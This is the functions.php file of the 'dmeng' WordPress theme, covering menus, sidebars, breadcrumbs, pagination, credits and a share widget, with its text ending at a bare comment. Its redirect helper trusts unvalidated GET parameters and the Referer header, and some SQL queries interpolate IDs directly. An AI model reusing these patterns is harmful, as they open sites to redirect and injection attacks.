<?php

/*
 * 欢迎来到代码世界，如果你想修改多梦主题的代码，那我猜你是有更好的主意了～
 * 那么请到多梦网络（ http://www.dmeng.net/ ）说说你的想法，数以万计的童鞋们会因此受益哦～
 * 同时，你的名字将出现在多梦主题贡献者名单中，并有一定的积分奖励～
 * 注释和代码同样重要～
 * @author 多梦 @email chihyu@aliyun.com 
 */

/*
 * 模板函数 @author 多梦 at 2014.06.19 
 * 
 */
 
$dmeng_css_path = get_bloginfo('template_url').'/css/dmeng-2.0.7.1.css';

/*
 * 移除WordPress版本信息和默认的canonical链接 @author 多梦 at 2014.06.19 
 * 
 */
remove_action( 'wp_head', 'wp_generator' ); 
remove_action( 'wp_head', 'rel_canonical' );
 
 /* 
 * 通过 after_setup_theme 添加启用多梦主题后要执行的动作 @author 多梦 at 2014.06.19 
 * 
 */
function dmeng_setup() {
	//~ 载入本地化语言文件
	load_theme_textdomain( 'dmeng', get_template_directory() . '/languages' );
	//~ 注册菜单
	register_nav_menus( array(
		'header_menu' => __( '头部菜单', 'dmeng' ),
		'header_right_menu' => __( '头部右侧菜单', 'dmeng' ),
		'link_menu' => __( '链接菜单', 'dmeng' ),
	) );
}
add_action( 'after_setup_theme', 'dmeng_setup' );

//~ 添加文章缩略图 @author 多梦 at 2014.09.04
add_theme_support( 'post-thumbnails', array( 'post', 'gift' ) );
set_post_thumbnail_size( 220, 146, true );

function dmeng_get_the_thumbnail($size = '300') {
	$post_thumbnail = (array)json_decode(get_option('dmeng_post_thumbnail','{"on":"1","suffix":"?imageView2/1/w/220/h/146/q/100"}'));
	$post_thumbnail_on = intval($post_thumbnail['on']);
	$post_thumbnail_suffix = $post_thumbnail['suffix'];
	if(!in_array($post_thumbnail_on,array(1,2))) return;
	$image_url = '';
	if ( has_post_thumbnail() ) {
		$image_url = wp_get_attachment_image_src( get_post_thumbnail_id() , $size);
		$image_url = $image_url[0];
	} else {
		if($post_thumbnail_on==2){
			global $post, $posts;
			$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
			if($output) $image_url = $matches[1][0];
		}
	}
	if($image_url){
		$image_url = $post_thumbnail_suffix ? $image_url.$post_thumbnail_suffix : $image_url;
		return apply_filters('dmeng_post_thumbnail', $image_url);
	}
}

//~ 自定义头部
add_theme_support( 'custom-header', array(
	'default-image'          => get_bloginfo('template_url').'/images/screenshot_64.png',
	'random-default'         => false,
	'width'                  => 64,
	'height'                 => 64,
	'flex-height'            => true,
	'flex-width'             => true,
	'default-text-color'     => '444444',
	'header-text'            => true,
	'uploads'                => true,
	'admin-preview-callback' => 'dmeng_custom_header_admin_preview'
) );
//~ 自定义背景
add_theme_support( 'custom-background' );

function dmeng_custom_header_admin_preview(){
		echo '<style>
#masthead{font: normal 14px/24px "Microsoft Yahei","冬青黑体简体中文 w3","宋体";float:left;width:100%;}
#masthead .header-logo{margin:0 15px 0 0;}
#masthead .header-logo{float:left;}
#masthead .header-text{color:#444}
#masthead .header-text .name{margin:5px 0 5px;font-size: 24px;font-weight: 500;line-height: 1.1;}
#masthead .header-text .name a{color:#444;text-decoration:none;}
#masthead .header-text .name a:hover{text-decoration:underline;}
#masthead .header-text .description{opacity: 0.9;}
</style>
<div id="masthead">' . dmeng_custom_header().'</div>';
}

function dmeng_custom_header(){
	$logo_html = $header_text = '';
	 
	if( get_header_image() ){
		$custom_header = get_custom_header();

		$logo_data = array();
		$logo_data['url'] = $custom_header->url ? $custom_header->url : get_theme_support( 'custom-header', 'default-image');
		$logo_data['width'] = $custom_header->width ? $custom_header->width : get_theme_support( 'custom-header', 'width');
		$logo_data['height'] = $custom_header->height ? $custom_header->height : get_theme_support( 'custom-header', 'height');

		$logo_html = sprintf(
									'<a href="%4$s" rel="home"><img src="%1$s" width="%2$s" height="%3$s" alt="%5$s" /></a>',
									$logo_data['url'],
									$logo_data['width'],
									$logo_data['height'],
									esc_url(home_url('/')),
									get_bloginfo('name')
								);

		$logo_html = '<div class="header-logo">'.$logo_html.'</div>';
	}

	if(display_header_text()){
		$textcolor = get_header_textcolor();
		$textcolor = in_array($textcolor, array('444', '444444')) ? '' : ' style="color:#'.$textcolor.'"';
		$header_text = '<div class="header-text">';
		$header_text .= sprintf('<div class="name"><a href="%1$s" rel="home" id="name"%2$s>%3$s</a></div>', esc_url( home_url( '/' ) ), $textcolor, get_bloginfo( 'name' ));
		$header_text .= '<div class="description" id="desc"'.$textcolor.'>'.get_bloginfo('description').'</div>';
		$header_text .= '</div>';
	}
	
	return $logo_html . $header_text;
}

//~ 登录用户浏览站点时不显示工具栏 @author 多梦 at 2014.06.19 
add_filter('show_admin_bar', '__return_false');

/*
 * 通过 widgets_init 动作定义侧边栏和小工具 @author 多梦 at 2014.06.19 
 * 
 */
function dmeng_widgets_init() {
	register_sidebar( array(
		'name' => __( '主侧边栏', 'dmeng' ),
		'id' => 'sidebar-1',
		'description' => __( '主要的侧边栏', 'dmeng' ),
		'before_widget' => '<aside id="%1$s" class="panel panel-default widget clearfix %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="panel-heading widget-title">',
		'after_title' => '</h3>',
	) );
	register_sidebar( array(
		'name' => __( '底部边栏', 'dmeng' ),
		'id' => 'sidebar-2',
		'description' => __( '显示在底部', 'dmeng' ),
		'before_widget' => '<aside id="%1$s" class="widget clearfix footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h3 class="panel-heading widget-title">',
		'after_title' => '</h3>',
	) );
}
add_action( 'widgets_init', 'dmeng_widgets_init' );

//~ 去除功能小工具的WordPress版权链接
function dmeng_widget_meta_poweredby($link){
	return;
}
add_filter('widget_meta_poweredby','dmeng_widget_meta_poweredby');
 
function dmeng_get_current_page_url(){
	$ssl = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') ? true:false;
    $sp = strtolower($_SERVER['SERVER_PROTOCOL']);
    $protocol = substr($sp, 0, strpos($sp, '/')) . (($ssl) ? 's' : '');
    $port  = $_SERVER['SERVER_PORT'];
    $port = ((!$ssl && $port=='80') || ($ssl && $port=='443')) ? '' : ':'.$port;
    $host = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME'];
    return $protocol . '://' . $host . $port . $_SERVER['REQUEST_URI'];
}

function dmeng_get_url($url, $post='', $method='GET'){
	$content = is_array($post) ? http_build_query($post) : $post;
	$content_length = strlen($content);
	$options = array(
            'http' => array(
                'method' => $method,
                'header' =>
                "Content-type: application/x-www-form-urlencoded\r\n" .
                "Content-length: $content_length\r\n",
                'content' => $content
            )
        );
	return file_get_contents($url, false, stream_context_create($options));
}

function dmeng_get_http_response_code($theURL) {
	@$headers = get_headers($theURL);
	return substr($headers[0], 9, 3);
}

//~ 保存提示
function dmeng_settings_error($type='updated',$message=''){
	$type = $type=='updated' ? 'updated' : 'error';
	if(empty($message)) $message = $type=='updated' ?  __('设置已保存。','dmeng') : __('保存失败，请重试。，','dmeng');
    add_settings_error(
        'dmeng_settings_message',
        esc_attr( 'dmeng_settings_updated' ),
		$message,
		$type
    );
    settings_errors( 'dmeng_settings_message' );
}

//~ 载入 Bootstrap 菜单类
require_once( get_template_directory() . '/inc/bootstrap_navwalker.php' );
//~ 载入用户页面
require_once( get_template_directory() . '/inc/user-page.php' );
//~ 载入文章/页面相关信息面板
require_once( get_template_directory() . '/inc/post-meta.php' );
//~ 载入自定义小工具
require_once( get_template_directory() . '/inc/widget.php' );
//~ 载入积分
require_once( get_template_directory() . '/inc/credit.php' );
//~ 载入评论列表
require_once( get_template_directory() . '/inc/commentlist.php' );
//~ 载入评论meta
require_once( get_template_directory() . '/inc/comment-meta.php' );
//~ 载入安全验证码
require_once( get_template_directory() . '/inc/nonce.php' );
//~ 载入流量统计
require_once( get_template_directory() . '/inc/tracker.php' );
//~ 载入meta（主要用于投票）
require_once( get_template_directory() . '/inc/meta.php' );
//~ 载入投票
require_once( get_template_directory() . '/inc/vote.php' );
//~ 载入提示信息
require_once( get_template_directory() . '/inc/message.php' );
//~ 载入设置页面
require_once( get_template_directory() . '/inc/settings.php' );
//~ 载入开放平台登录
require_once( get_template_directory() . '/inc/open.php' );
//~ 载入邮件
require_once( get_template_directory() . '/inc/mail.php' );
//~ 载入最近用户
require_once( get_template_directory() . '/inc/recent-user.php' );
//~ 载入短代码
require_once( get_template_directory() . '/inc/shortcode.php' );
//~ 载入SEO
require_once( get_template_directory() . '/inc/seo.php' );
//~ 载入广告
require_once( get_template_directory() . '/inc/adsense.php' );
//~ 载入版本
require_once( get_template_directory() . '/inc/version.php' );
//~ 载入积分换礼
if( intval(get_option('dmeng_is_gift_open', 0)) ){
	require_once( get_template_directory() . '/inc/gift.php' );
}

//~ 载入缓存
require_once( get_template_directory() . '/inc/cache.php' );

function dmeng_get_avatar( $id , $size='40' , $type='' , $lazy=true ){

	if($type==='qq'){
		
		$O = array(
			'ID'=>get_option('dmeng_open_qq_id'),
			'KEY'=>get_option('dmeng_open_qq_key')
		);
		
		$U = array(
			'ID'=>get_user_meta( $id, 'dmeng_qq_openid', true ),
			'TOKEN'=>get_user_meta( $id, 'dmeng_qq_access_token', true )
		);
		
		if( $O['ID'] && $O['KEY'] && $U['ID'] && $U['TOKEN'] ){
			$avatar_url = 'http://q.qlogo.cn/qqapp/'.$O['ID'].'/'.$U['ID'].'/100';
		}
		
	}else if($type==='weibo'){
		
		$O = array(
			'KEY'=>get_option('dmeng_open_weibo_key'),
			'SECRET'=>get_option('dmeng_open_weibo_secret')
		);

		$U = array(
			'ID'=>get_user_meta( $id, 'dmeng_weibo_openid', true ),
			'TOKEN'=>get_user_meta( $id, 'dmeng_weibo_access_token', true )
		);
		
		if( $O['KEY'] && $O['SECRET'] && $U['ID'] && $U['TOKEN'] ){
			$avatar_url = 'http://tp3.sinaimg.cn/'.$U['ID'].'/180/1.jpg';
		}
		
	}else{

		preg_match("/src='(.*?)'/i", get_avatar( $id, $size ), $matches);
		$avatar_url = $matches[1];
	
	}
	
	return $lazy ? '<img src="'.get_bloginfo('template_url').'/images/grey.png" data-original="'.$avatar_url.'" class="avatar" width="'.$size.'" height="'.$size.'" />' :  '<img src="'.$avatar_url.'" class="avatar" width="'.$size.'" height="'.$size.'" />';
}

function dmeng_get_avatar_type($user_id){
	$id = (int)$user_id;
	if($id===0) return;
	$avatar = get_user_meta($id,'dmeng_avatar',true);
	if( $avatar=='qq' && dmeng_is_open_qq($id) ) return 'qq';
	if( $avatar=='weibo' && dmeng_is_open_weibo($id) ) return 'weibo';
	return 'default';
}

/*
 * 作者/发布时间/评论/分类等相关信息 @author 多梦 at 2014.06.20 
 * 
 */
function dmeng_post_meta(){
		?>
<div class="entry-meta">
<?php
//~ 如果是文章或页面输出字体设置按钮
if( is_single() || is_page() ) { ?>
	<div class="entry-set-font"><span id="set-font-small" class="disabled">A<sup>-</sup></span><span id="set-font-big">A<sup>+</sup></span></div>
<?php }  //~ 字体设置按钮判断结束 ?>
	<span class="glyphicon glyphicon-user"></span> <a href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" itemprop="author"><?php echo get_the_author();?></a>
	<span class="glyphicon glyphicon-time"></span> <time class="entry-date" datetime="<?php echo get_the_date( 'c' );?>"  itemprop="datePublished"><?php echo get_the_date();?></time>
	<span class="glyphicon glyphicon-comment"></span> <a href="<?php the_permalink();?>#comments" itemprop="discussionUrl" itemscope itemtype="http://schema.org/Comment"><span itemprop="interactionCount"><?php comments_number( '0', '1', '%' );?></span></a>
	<span class="glyphicon glyphicon-eye-open"></span> <?php printf( __( '%s 次浏览', 'dmeng' ) , get_dmeng_traffic('single',get_the_ID()) ); ?>
<?php 
//~ 如果是文章页则输出分类和标签，因为只有文章才有～
if( get_post_type()=='post' ) {
	$categories = get_the_category();
	if($categories){
		foreach($categories as $category) {
			$cats[] = '<a href="'.get_category_link( $category->term_id ).'" rel="category" itemprop="articleSection">'.$category->name.'</a>';
		}
		echo '<span class="glyphicon glyphicon-folder-open"></span> ' . join(' | ',$cats);
	}
	$tags = get_the_tag_list('<span class="glyphicon glyphicon-tags"></span> ',' | ');
	if($tags) echo '<span itemprop="keywords">'.$tags.'</span>';
}  //~ 文章页判断结束
?>
</div>
		<?php
}

function dmeng_post_footer(){
	global $post;
	$post_excerpt = $post->post_excerpt ? $post->post_excerpt : $post->post_content;
	$post_excerpt = str_replace(array("\t", "\r\n", "\r", "\n"), "", strip_tags($post_excerpt)); 
?>
				<div class="entry-footer clearfix" role="toolbar">
					<div class="bd-share">
						<?php 
							$bdshare_output = '<div class="bdsharebuttonbox"><a class="bds_qzone" data-cmd="qzone"></a><a class="bds_tsina" data-cmd="tsina"></a><a class="bds_weixin" data-cmd="weixin"></a><a class="bds_more" data-cmd="more"></a></div>';
							$bdshare_output .= '<script>';
							$bdshare_output .= sprintf( "var share_excerpt = '%s';", addslashes(mb_strcut(sprintf( '【%s】%s', esc_html(get_the_title()), $post_excerpt ), 0, 340, 'utf-8').'...' ));
							$bdshare_output .= sprintf( "var share_pic = '%s';", dmeng_get_the_thumbnail('post-thumbnail') );
							$bdshare_output .= sprintf( "var share_url = '%s';", add_query_arg('fid', get_current_user_id(), get_permalink()) );
							$bdshare_output .= sprintf( "var wkey = '%s';var qkey = '%s';", get_option('dmeng_open_weibo_key', ''), get_option('dmeng_open_qq_id', '') );
							$bdshare_output .= "window._bd_share_config = { common : { bdText : share_excerpt,bdDesc : share_excerpt,bdUrl : share_url, bdPic : share_pic, bdSnsKey : {'tsina':wkey, 'tqq':qkey,'qzone':qkey} }, share : [{ 'bdStyle' : 1, 'bdSize' : 24 }] };with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];";
							$bdshare_output .= '</script>';
							echo $bdshare_output;
						?>
					</div>
					<?php dmeng_vote_html('post',get_the_ID()); dmeng_breadcrumb_html(get_the_ID(),' › ');?>
				</div>
<?php	
}

/*
 * 版权声明
 * 
 */

function dmeng_post_copyright($post_id){
	
	$post_id = (int)$post_id;
	if(!$post_id) return;

	if( (int)get_option('dmeng_copyright_status_all',1)===1 && (int)get_post_meta( $post_id, 'dmeng_copyright_status', true )!==9 ){
		$cc = get_post_meta( $post_id, 'dmeng_copyright_content', true );
		$cc = empty($cc) ? get_option('dmeng_copyright_content_default',sprintf(__('原文链接：%s，转发请注明来源！','dmeng'),'<a href="{link}" rel="author">{title}</a>')) : $cc;
		$cc = stripcslashes(htmlspecialchars_decode($cc));
		if($cc){
			
		?><div class="entry-details" itemprop="copyrightHolder" itemtype="http://schema.org/Organization" itemscope>
			<details>
				<summary><?php 
					if($cc){
						$cc = str_replace(array( '{name}', '{url}', '{title}', '{link}'), array(get_bloginfo('name'), home_url('/'), get_the_title($post_id), get_permalink($post_id)), $cc);
						echo $cc;
						}
				?></summary>
			</details>
	</div><?php
		}
	}
}

function dmeng_breadcrumb_output($url,$name){
	return '<span itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="'.esc_url($url).'" title="'.$name.'" itemprop="url"><span itemprop="title">'.$name.'</span></a></span>';
}

function dmeng_get_category_parents( $id, $separator='', $visited = array() ) {
	$chain = '';
	$parent = get_term( $id, 'category' );
	if ( is_wp_error( $parent ) )
		return $parent;

	$name = $parent->name;

	if ( $parent->parent && ( $parent->parent != $parent->term_id ) && !in_array( $parent->parent, $visited ) ) {
		$visited[] = $parent->parent;
		$chain .= dmeng_get_category_parents( $parent->parent, $separator, $visited );
	}

	$chain .= dmeng_breadcrumb_output( get_category_link( $parent->term_id ), $name).$separator;

	return $chain;
}

function dmeng_breadcrumb_html($post_id,$separator){
	$path[] = dmeng_breadcrumb_output( home_url('/'), get_bloginfo('name'));
	if( get_post_type($post_id)=='post' ) {
		$cats_id = array();
		$categories = get_the_category($post_id);
		if($categories){
			foreach($categories as $category) {
				if(!in_array($category->term_id,$cats_id)){
					if ( $category->parent ){
						$path[] = dmeng_get_category_parents( $category->parent, $separator );
						$cats_id[] = $category->parent;
					}
					$path[] = dmeng_breadcrumb_output( get_category_link( $category->term_id ), $category->name);
					$cats_id[] = $category->term_id;
				}
			}
		}
	}
	if( is_singular() ){
		$post_type = get_post_type();
		$post_type_obj = get_post_type_object( $post_type );
		$path[] = dmeng_breadcrumb_output( get_post_type_archive_link( $post_type ), $post_type_obj->labels->singular_name);
	}
	$path[] = dmeng_breadcrumb_output( get_permalink($post_id), get_the_title($post_id));
	echo join( $separator ,$path);
}

//~ 编辑器样式
function dmeng_mce_css($mce_css){
	if ( ! empty( $mce_css ) ) $mce_css .= ',';
	$mce_css .= get_bloginfo('template_url').'/css/bootstrap.min.css,'.$GLOBALS['dmeng_css_path'];
	return $mce_css;
}
add_filter( 'mce_css', 'dmeng_mce_css');

//规定摘要字数
function dmeng_excerpt_length( $length ) {
	return 120;
}
add_filter( 'excerpt_length', 'dmeng_excerpt_length', 999 );
//改变摘要结束省略符号
function dmeng_excerpt_more( $more ) {
	return ' ...';
}
add_filter('excerpt_more', 'dmeng_excerpt_more'); 
function dmeng_password_form() {
    global $post;
    $label = 'pwbox-'.( empty( $post->ID ) ? rand() : $post->ID );
    $o = '<form action="' . esc_url( add_query_arg('action','postpass',wp_login_url()) ) . '" method="post" class="form-inline"><ul class="list-inline"><li><input name="post_password" id="' . $label . '" type="password" class="form-control" placeholder="'.__('请输入密码 …','dmeng').'"></li><li><button type="submit" class="btn btn-default" id="searchsubmit">'.__('提交','dmeng').'</button></li></ul><span class="help-block">' . __( '这是一篇受密码保护的文章，您需要提供访问密码。','dmeng' ) . '</span></form>';
    return $o;
}
add_filter( 'the_password_form', 'dmeng_password_form' );
//文章归档分页导航
function dmeng_paginate($wp_query=''){
	if(empty($wp_query)) global $wp_query;
	$pages = $wp_query->max_num_pages;
	if ( $pages >= 2 ):
		$big = 999999999;
		$paginate = paginate_links( array(
			'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
			'format' => '?paged=%#%',
			'current' => max( 1, get_query_var('paged') ),
			'total' => $pages,
			'type' => 'array'
		) );
		echo '<ul class="pagination" role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement">';
		foreach ($paginate as $value) {
			echo '<li itemprop="name">'.$value.'</li>';
		}
		echo '</ul>';
	endif;
}
//文章页上一篇下一篇导航
function dmeng_post_nav(){

	$previous = get_adjacent_post( false, '', true );
	$next = get_adjacent_post( false, '', false );

	if ( ( ! $next && ! $previous ) || is_attachment() ) {
		return;
	}

	?><nav class="pager" role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement">
			<?php
				previous_post_link( '<li class="previous">%link</li>', __( '<span class="text-muted">上一篇：</span> <span itemprop="name">%title</span>', 'dmeng' ), true );
				next_post_link( '<li class="next">%link</li>', __( '<span class="text-muted">下一篇：</span> <span itemprop="name">%title</span>', 'dmeng' ), true );
			?>
	</nav><!-- .navigation --><?php
}
//文章内容分页导航
function dmeng_post_page_nav($echo=true){

	return wp_link_pages( array(
		'before'      => '<nav class="pager" role="navigation" itemscope itemtype="http://schema.org/SiteNavigationElement"><span>'.__('分页','dmeng').'</span>',
		'after'       => '</nav><!-- .navigation -->',
		'link_before' => '<span itemprop="name">',
		'link_after'  => '</span>',
		'pagelink' => __('%','dmeng'),
		'echo' => $echo
	) );

}
//评论分页导航
function dmeng_paginate_comments($post_id='',$current='',$max=''){

	global $wp_rewrite;

	if ( !$post_id && ( !is_singular() || !get_option('page_comments') ) )
		return;

	$post_link = $post_id ? get_permalink($post_id) : get_permalink();
	$page = $current ? $current : get_query_var('cpage');
	if ( !$page )
		$page = 1;
	$max_page = $max ? $max : get_comment_pages_count();
	$defaults = array(
		'base' => add_query_arg( 'cpage', '%#%', $post_link ),
		'format' => '',
		'total' => $max_page,
		'current' => $page,
		'echo' => false,
		'add_fragment' => '#comments',
		'mid_size' => 4,
		'prev_next' => false,
	);
	if ( $wp_rewrite->using_permalinks() ){
		$defaults['base'] = user_trailingslashit(trailingslashit($post_link) . 'comment-page-%#%', 'commentpaged');
	}
	
	$page_links = paginate_links( $defaults );

	if ( $max_page >= 2 )
		return '<ul id="pagination-comments" role="navigation" data-max-page="'.$max_page.'">'.$page_links.'</ul>';
	
}
// 文章目录
function dmeng_article_index($content) {
	$post_index = (int)get_option('dmeng_post_index_all',1);
	if( in_array($post_index,array(1,2,3) ) && ( is_single() || is_page() ) ){
		if( $post_index===2 && is_page() ) return $content;
		if( $post_index===3 && is_single() ) return $content;
		$matches = array();  
		$index_li = $ol = $depth_num = '';
		if(preg_match_all("/<h([2-6]).*?\>(.*?)<\/h[2-6]>/is", $content, $matches)) {

			//~ $matches[0] 是原标题，包括标签，如<h2>标题</h2>
			//~ $matches[1] 是标题层级，如<h2>就是“2”
			//~ $matches[2] 是标题内容，如<h2>标题</h2>就是“标题”
			
			foreach( $matches[1] as $key=>$level ) {

				if( $ol && intval($ol)<$level){
					$index_li .= '<ul>';
					$depth_num = intval($depth_num)+1;
				}

				if( $ol && intval($ol)>$level ){
					$index_li .= '</li>'.str_repeat('</ul></li>', intval($depth_num));
					$depth_num = 0;
				}
				
				$content = str_replace($matches[0][$key], '<h'.$level.' id="'.($key+1).'">'.$matches[2][$key].'</h'.$level.'>', $content);
				if( $ol && intval($ol)==$level) $index_li .= '</li>';
				$index_li .= '<li><a href="#'.($key+1).'">'.$matches[2][$key].'</a>';

				if(($key+1)==count($matches[1])) $index_li .= '</li>'.str_repeat('</ul></li>', intval($depth_num));

				$ol = $level;
			}
			$content = '<div class="article_index"><h5>'.__('文章目录','dmeng').'<span class="caret"></span></h5><ul>' . $index_li . '</ul></div>' . $content;
		}
	}
    return $content;
}
add_filter( "the_content", "dmeng_article_index" );

// canonical
function dmeng_canonical_url(){

	switch(TRUE){
		
		case is_home() :
		case is_front_page() :
			$url = home_url('/');
		break;
		
		case is_single() :
			$url = get_permalink();
		break;
		
		case is_tax() :
		case is_tag() :
		case is_category() :
			$term = get_queried_object(); 
			$url = get_term_link( $term, $term->taxonomy ); 
		break;
		
		case is_post_type_archive() :
			$url = get_post_type_archive_link( get_post_type() ); 
		break;
		
		case is_author() : 
			$url = get_author_posts_url( get_query_var('author'), get_query_var('author_name') ); 
		break;
		
		case is_year() : 
			$url = get_year_link( get_query_var('year') ); 
		break;
		
		case is_month() : 
			$url = get_month_link( get_query_var('year'), get_query_var('monthnum') ); 
		break;
		
		case is_day() : 
			$url = get_day_link( get_query_var('year'), get_query_var('monthnum'), get_query_var('day') ); 
		break;
		
		default :
			$url = dmeng_get_current_page_url();
	}
	
    if ( get_query_var('paged') > 1 ) { 
		global $wp_rewrite; 
		if ( $wp_rewrite->using_permalinks() ) { 
			$url = user_trailingslashit( trailingslashit( $url ) . trailingslashit( $wp_rewrite->pagination_base ) . get_query_var('paged'), 'archive' ); 
		} else { 
			$url = add_query_arg( 'paged', get_query_var('paged'), $url ); 
		}
	}
	
	return $url;

}

function dmeng_get_redirect_uri(){
	if( isset($_GET['redirect_uri']) ) return urldecode($_GET['redirect_uri']);
	if( isset($_GET['redirect_to']) ) return urldecode($_GET['redirect_to']);
	if( isset($_GET['redirect']) ) return urldecode($_GET['redirect']);
	if( isset($_SERVER['HTTP_REFERER']) ) return urldecode($_SERVER['HTTP_REFERER']);
	return home_url();
}

//~ 投稿文章发表时给作者添加积分和发送邮件通知
function dmeng_pending_to_publish( $post ) {

	$rec_post_num = (int)get_option('dmeng_rec_post_num','5');
	$rec_post_credit = (int)get_option('dmeng_rec_post_credit','50');
	$rec_post = (int)get_user_meta( $post->post_author, 'dmeng_rec_post', true );
	
	if( $rec_post<$rec_post_num && $rec_post_credit ){
	
		update_dmeng_credit( $post->post_author , $rec_post_credit , 'add' , 'dmeng_credit' , sprintf(__('获得文章投稿奖励%1$s积分','dmeng') ,$rec_post_credit) );

		//~ 10秒后发送邮件
		$user_email = get_user_by( 'id', $post->post_author )->user_email;
		if( filter_var( $user_email , FILTER_VALIDATE_EMAIL)){
			$email_title = sprintf(__('你在%1$s上有新的文章发表','dmeng'),get_bloginfo('name'));
			$email_content = sprintf(__('<h3>%1$s，你好！</h3><p>你的文章%2$s已经发表，快去看看吧！</p>','dmeng'), get_user_by( 'id', $post->post_author )->display_name, '<a href="'.get_permalink($post->ID).'" target="_blank">'.$post->post_title.'</a>');
			//~ wp_schedule_single_event( time() + 10, 'dmeng_send_email_event', array( $user_email , $email_title, $email_content ) );
			dmeng_send_email( $user_email , $email_title, $email_content );
		}
	}
	
	update_user_meta( $post->post_author, 'dmeng_rec_post', $rec_post+1);

}
add_action( 'pending_to_publish',  'dmeng_pending_to_publish', 10, 1 );

//~ 发表评论时给作者添加积分
function dmeng_comment_add_credit($comment_id, $comment_object){
	
	$user_id = $comment_object->user_id;
	
	if($user_id){
		
		$rec_comment_num = (int)get_option('dmeng_rec_comment_num','50');
		$rec_comment_credit = (int)get_option('dmeng_rec_comment_credit','5');
		$rec_comment = (int)get_user_meta( $user_id, 'dmeng_rec_comment', true );
		
		if( $rec_comment<$rec_comment_num && $rec_comment_credit ){
			update_dmeng_credit( $user_id , $rec_comment_credit , 'add' , 'dmeng_credit' , sprintf(__('获得评论回复奖励%1$s积分','dmeng') ,$rec_comment_credit) );
			update_user_meta( $user_id, 'dmeng_rec_comment', $rec_comment+1);
		}
	}
}
add_action('wp_insert_comment', 'dmeng_comment_add_credit' , 99, 2 );

function dmeng_before_delete_post( $post_id ){
	
	global $wpdb;
	$table_tracker = $wpdb->prefix . 'dmeng_tracker';
	
	//~ 删除该文章的浏览数据
	$wpdb->query( " DELETE FROM $table_tracker WHERE type='single' AND pid='$post_id' " );
}
add_action( 'before_delete_post', 'dmeng_before_delete_post' );

function dmeng_delete_user( $user_id ) {
	
	global $wpdb;
	$table_message = $wpdb->prefix . 'dmeng_message';
	$table_meta = $wpdb->prefix . 'dmeng_meta';
	
	//~ 删除该用户的消息数据
	$wpdb->query( " DELETE FROM $table_message WHERE user_id='$user_id' " );
	
	//~ 更新投票数据为游客投票
	$wpdb->query( " UPDATE $table_meta SET user_id = 0 WHERE user_id='$user_id' " );
	
		//~ 10秒后发送邮件通知
		$user_email = get_user_by( 'id', $user_id )->user_email;
		if( filter_var( $user_email , FILTER_VALIDATE_EMAIL)){
			$email_title = sprintf(__('你在%1$s上的账号已被注销','dmeng'), get_bloginfo('name'));
			$email_content = sprintf(__('<h3>%1$s，你好！</h3><p>你在%2$s上的账号已被注销！</p>','dmeng'), get_user_by( 'id', $user_id )->display_name, get_bloginfo('name'));
			//~ wp_schedule_single_event( time() + 10, 'dmeng_send_email_event', array( $user_email , $email_title, $email_content ) );
			dmeng_send_email( $user_email , $email_title, $email_content );
		}
	
}
add_action( 'delete_user', 'dmeng_delete_user' );

function dmeng_strip_tags($data){
		return esc_html($data);
}
add_filter( "pre_comment_content", "dmeng_strip_tags" );

function dmeng_get_look(){
	$text = array('[呵呵]', '[嘻嘻]', '[哈哈]', '[可爱]', '[可怜]', '[挖鼻屎]', '[吃惊]', '[害羞]', '[挤眼]', '[闭嘴]', '[鄙视]', '[爱你]', '[泪]', '[偷笑]', '[亲亲]', '[生病]', '[太开心]', '[懒得理你]', '[右哼哼]', '[左哼哼]', '[嘘]', '[衰]', '[委屈]', '[吐]');
	$file = array('hehe.gif', 'xixi.gif', 'haha.gif', 'keai.gif', 'kelian.gif', 'wabishi.gif', 'chijing.gif', 'haixiu.gif', 'jiyan.gif', 'bizui.gif', 'bishi.gif', 'aini.gif', 'lei.gif', 'touxiao.gif', 'qinqin.gif', 'shengbing.gif', 'taikaixin.gif', 'landelini.gif', 'youhengheng.gif', 'zuohengheng.gif', 'xu.gif', 'shuai.gif', 'weiqu.gif', 'tu.gif');
	return array( 'text'=>$text, 'file'=>$file);
}

function dmeng_replace_comment_text($content){

	$look = dmeng_get_look();
	$images_path = get_bloginfo('template_url').'/images';
	
	$format = ( is_admin() && !( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) ? '<img class="look" src="%2$s" width="22" height="22" />' : '<img class="look" src="%1$s" data-original="%2$s" width="22" height="22" />';

	foreach( $look['file'] as $file ){
		$html[] = sprintf($format, $images_path.'/grey.png', $images_path.'/look/'.$file);
	}

	$content = str_replace($look['text'], $html, $content);
	return $content;
}
add_filter('get_comment_text', 'dmeng_replace_comment_text');

function dmeng_remove_open_sans_from_wp_core() {
	wp_deregister_style( 'open-sans' );
	wp_register_style( 'open-sans', false );
	wp_enqueue_style('open-sans','');
}
add_action( 'init', 'dmeng_remove_open_sans_from_wp_core' );

//~ 上一页下一页和页码的分页导航
function dmeng_pager($current, $max){

	$paged = intval($current);
	$pages = intval($max);
	if($pages<2) return '';

	$pager = '<div class="dmeng-pager clearfix">';

		$pager .= '<div class="btn-group">';
		
			if($paged>1) $pager .= '<a class="btn btn-default" href="' . add_query_arg('page',$paged-1) . '">'.__('上一页','dmeng').'</a>';
			if($paged<$pages) $pager .= '<a class="btn btn-default" href="' . add_query_arg('page',$paged+1) . '">'.__('下一页','dmeng').'</a>';
			
		$pager .= '</div>';
	
		if ($pages>2 ){
			$pager .= '<div class="btn-group pull-right"><select class="form-control pull-right" onchange="document.location.href=this.options[this.selectedIndex].value;">';
				for( $i=1; $i<=$pages; $i++ ){
					$class = $paged==$i ? 'selected="selected"' : '';
					$pager .= sprintf('<option %s value="%s">%s</option>', $class, add_query_arg('page',$i), sprintf(__('第 %s 页', 'dmeng'), $i));
				}
			$pager .= '</select></div>';
		}
	
	$pager .= '</div>';
	
	return $pager;
}

//~ 高亮关键词
